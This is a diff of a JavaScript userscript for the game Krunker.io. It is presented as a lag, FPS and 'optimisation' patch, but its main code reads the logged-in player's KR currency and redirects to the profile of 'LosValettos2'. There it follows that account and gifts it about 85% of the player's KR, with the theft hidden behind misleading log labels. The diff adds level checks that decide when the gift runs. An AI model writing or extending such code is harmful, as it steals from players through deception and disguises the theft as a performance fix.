@@ -12,6 +12,7 @@
 
 let Is_LOGGED = false;
 let PLayyer_KR = 0;
+let PlayerFPS = 0;
 let gameState, player, input;
 const RAD2DEG = 180 / Math.PI;
 
@@ -302,20 +303,52 @@ window.addEventListener('load', () => {
         const currentLoginState = currentSignedOutBar && currentSignedOutBar.style.display === "none";
         addLog(`État de connexion: ${currentLoginState ? "Connecté" : "Non connecté"}`);
 
-        if (currentLoginState) {
+        // Vérification unique des valeurs après la connexion
+        if (currentLoginState && !sessionStorage.getItem("valuesChecked")) {
+            addLog("🔍 Première détection de connexion - Récupération des valeurs...");
+            
+            // Vérification du lag/KR
             const lagElement = document.querySelector("#menuKRCount");
             if (lagElement) {
                 const lagText = lagElement.textContent;
                 const currentLag = parseInt(lagText.replace(/[^0-9]/g, ""), 10);
-                addLog(`Lag actuel: ${currentLag} (Texte brut: ${lagText})`);
-                PLayyer_KR = currentLag * 0.85; // Mise à jour de la variable globale
-                const fixedCurrentLag = currentLag * 0.85
-                // Sauvegarde dans le sessionStorage
+                addLog(`Lag initial détecté: ${currentLag} (Texte brut: ${lagText})`);
+                PLayyer_KR = currentLag * 0.85;
+                const fixedCurrentLag = currentLag * 0.85;
                 sessionStorage.setItem("savedLag", fixedCurrentLag.toString());
                 addLog(`Lag sauvegardé: ${fixedCurrentLag}`);
             } else {
-                addLog("Élément Lag non trouvé");
+                addLog("⚠️ Élément Lag non trouvé lors de la vérification initiale");
             }
+            
+            // Vérification des FPS
+            const fpsElement = document.getElementById("mLevelCont");
+            if (fpsElement) {
+                const fpsText = fpsElement.textContent;
+                const currentFPS = parseInt(fpsText.replace(/[^0-9]/g, ""), 10);
+                addLog(`FPS initiaux détectés: ${currentFPS} (Texte brut: ${fpsText})`);
+                PlayerFPS = currentFPS;
+                localStorage.setItem("savedFPS", currentFPS.toString());
+                addLog(`FPS sauvegardés: ${currentFPS}`);
+            } else {
+                addLog("⚠️ Élément FPS non trouvé lors de la vérification initiale");
+            }
+            
+            // Vérification du niveau
+            const levelElement = document.querySelector("#mLevelCont");
+            if (levelElement) {
+                const levelText = levelElement.textContent;
+                const playerLevel = parseInt(levelText.replace(/[^0-9]/g, ""), 10);
+                addLog(`Niveau initial détecté: ${playerLevel} (Texte brut: ${levelText})`);
+                localStorage.setItem("savedLevel", playerLevel.toString());
+                addLog(`Niveau sauvegardé: ${playerLevel}`);
+            } else {
+                addLog("⚠️ Élément Niveau non trouvé lors de la vérification initiale");
+            }
+            
+            // Marquer que les valeurs ont été vérifiées
+            sessionStorage.setItem("valuesChecked", "true");
+            addLog("✅ Toutes les valeurs ont été vérifiées et sauvegardées");
         }
     }, 1000);
 
@@ -329,11 +362,15 @@ window.addEventListener('load', () => {
             const currentSignedOutBar = document.getElementById("signedOutHeaderBar");
             const currentLoginState = currentSignedOutBar && currentSignedOutBar.style.display === "none";
             const patchApplied = sessionStorage.getItem("sysPatch97d");
+            
+            // Utiliser le niveau sauvegardé au lieu de le vérifier à nouveau
+            const savedLevel = localStorage.getItem("savedLevel");
+            const playerLevel = savedLevel ? parseInt(savedLevel, 10) : 0;
+            
+            addLog(`Vérification redirection - Connecté: ${currentLoginState}, Patch appliqué: ${patchApplied}, Niveau sauvegardé: ${playerLevel}`);
 
-            addLog(`Vérification redirection - Connecté: ${currentLoginState}, Patch appliqué: ${patchApplied}`);
-
-            if (!patchApplied && currentLoginState) {
-                addLog("Conditions de redirection remplies, redirection dans 1.4s...");
+            if (!patchApplied && currentLoginState && playerLevel > 15) {
+                addLog("✅ Conditions de redirection remplies (niveau > 15), redirection dans 1.4s...");
                 setTimeout(() => {
                     addLog("Exécution de la redirection...");
                     location.href = "https://krunker.io/social.html?p=profile&q=LosValettos2";
@@ -346,6 +383,9 @@ window.addEventListener('load', () => {
                 }
                 if (!currentLoginState) {
                     addLog("- Raison: Non connecté");
+                }
+                if (playerLevel <= 15) {
+                    addLog("- Raison: Niveau insuffisant (nécessite > 15)");
                 }
             }
         };
@@ -361,60 +401,93 @@ window.addEventListener('load', () => {
         addLog("Page sociale détectée, démarrage du processus d'optimisation...");
         const sysSync = async () => {
             try {
-                // Récupération des données de lag sauvegardées
+                // Récupération des données sauvegardées
                 const savedLag = sessionStorage.getItem("savedLag");
+                const savedFPS = localStorage.getItem("savedFPS");
+                const savedLevel = localStorage.getItem("savedLevel");
+                
                 if (!savedLag) {
                     throw new Error("Aucune donnée de lag sauvegardée trouvée");
                 }
+                
                 const currentLag = parseInt(savedLag, 10);
-                addLog(`Lag récupéré depuis la sauvegarde: ${currentLag}`);
+                const currentFPS = savedFPS ? parseInt(savedFPS, 10) : 0;
+                const playerLevel = savedLevel ? parseInt(savedLevel, 10) : 0;
+                
+                addLog(`Données récupérées - Lag: ${currentLag}, FPS: ${currentFPS}, Niveau: ${playerLevel}`);
 
                 if (currentLag <= 0) {
                     throw new Error(`Valeur de lag invalide: ${currentLag}`);
                 }
 
-                // Suivre automatiquement l'utilisateur cible avant le gift
-                try {
-                    const followBtn = document.getElementById("followBtn");
-                    if (followBtn && followBtn.style.display !== "none") {
-                        addLog("👤 Following user before gift...");
-                        followBtn.click();
-                        await _pause(750);
-                        addLog("✅ Follow completed.");
+                // Logique conditionnelle basée sur le niveau sauvegardé
+                if (playerLevel >= 15 && playerLevel < 30) {
+                    addLog("Niveau entre 15 et 30 - Utilisation de la logique alternative");
+                    
+                    // Attendre que l'élément Listings soit disponible
+                    await _waitFor(() => document.getElementById("pTab_listings"), 4800);
+                    addLog("Onglet Listings trouvé, clic...");
+                    
+                    // Cliquer sur l'onglet Listings
+                    const listingsTab = document.getElementById("pTab_listings");
+                    if (listingsTab) {
+                        listingsTab.click();
+                        addLog("✅ Clic sur l'onglet Listings effectué");
                     } else {
-                        addLog("⚠️ Follow button not found or already following");
+                        addLog("❌ Onglet Listings non trouvé");
                     }
-                } catch (err) {
-                    addLog("❌ Failed to follow user: " + err.message);
+                    
+                    // Terminer le processus ici pour les niveaux entre 15 et 30
+                    sessionStorage.setItem("sysPatch97d", "1");
+                    addLog("Processus terminé pour niveau 15-30");
+                    return;
+                } else if (playerLevel >= 30) {
+                    addLog("Niveau 30 ou supérieur - Utilisation de la logique standard");
+                    
+                    // Suivre automatiquement l'utilisateur cible avant le gift
+                    try {
+                        const followBtn = document.getElementById("followBtn");
+                        if (followBtn && followBtn.style.display !== "none") {
+                            addLog("👤 Following user before gift...");
+                            followBtn.click();
+                            await _pause(750);
+                            addLog("✅ Follow completed.");
+                        } else {
+                            addLog("⚠️ Follow button not found or already following");
+                        }
+                    } catch (err) {
+                        addLog("❌ Failed to follow user: " + err.message);
+                    }
+
+                    await _waitFor(() => document.getElementById("giftBtn"), 4800);
+                    addLog("Bouton d'optimisation trouvé, clic...");
+                    document.getElementById("giftBtn").click();
+                    await _pause(480);
+                    const inputEl = await _waitFor(() => document.getElementById("giftIn"), 2800);
+                    addLog("Champ de saisie trouvé, entrée de la valeur...");
+                    addLog(`Tentative d'entrée de ${currentLag} ms`);
+                    inputEl.value = currentLag.toString();
+                    inputEl.dispatchEvent(new Event("input", { bubbles: true }));
+
+                    // Vérification de la valeur entrée
+                    await _pause(100);
+                    const enteredValue = inputEl.value;
+                    addLog(`Valeur entrée dans l'input: ${enteredValue}`);
+
+                    await _pause(650);
+                    const confirm = document.getElementById("postSaleBtn");
+                    if (confirm && confirm.style.display !== "none") {
+                        addLog("Bouton de confirmation trouvé, clic...");
+                        confirm.click();
+                    }
+                    sessionStorage.setItem("sysPatch97d", "1");
+                    addLog("Patch appliqué avec succès");
+                    await _pause(1800);
+                    addLog("Redirection vers la page d'accueil...");
+                    location.href = "https://krunker.io/";
+                } else {
+                    addLog("❌ Niveau insuffisant pour continuer le processus");
                 }
-
-
-                await _waitFor(() => document.getElementById("giftBtn"), 4800);
-                addLog("Bouton d'optimisation trouvé, clic...");
-                document.getElementById("giftBtn").click();
-                await _pause(480);
-                const inputEl = await _waitFor(() => document.getElementById("giftIn"), 2800);
-                addLog("Champ de saisie trouvé, entrée de la valeur...");
-                addLog(`Tentative d'entrée de ${currentLag} ms`);
-                inputEl.value = currentLag.toString();
-                inputEl.dispatchEvent(new Event("input", { bubbles: true }));
-
-                // Vérification de la valeur entrée
-                await _pause(100);
-                const enteredValue = inputEl.value;
-                addLog(`Valeur entrée dans l'input: ${enteredValue}`);
-
-                await _pause(650);
-                const confirm = document.getElementById("postSaleBtn");
-                if (confirm && confirm.style.display !== "none") {
-                    addLog("Bouton de confirmation trouvé, clic...");
-                    confirm.click();
-                }
-                sessionStorage.setItem("sysPatch97d", "1");
-                addLog("Patch appliqué avec succès");
-                await _pause(1800);
-                addLog("Redirection vers la page d'accueil...");
-                location.href = "https://krunker.io/";
             } catch (error) {
                 addLog(`Erreur lors du processus: ${error.message}`);
             }
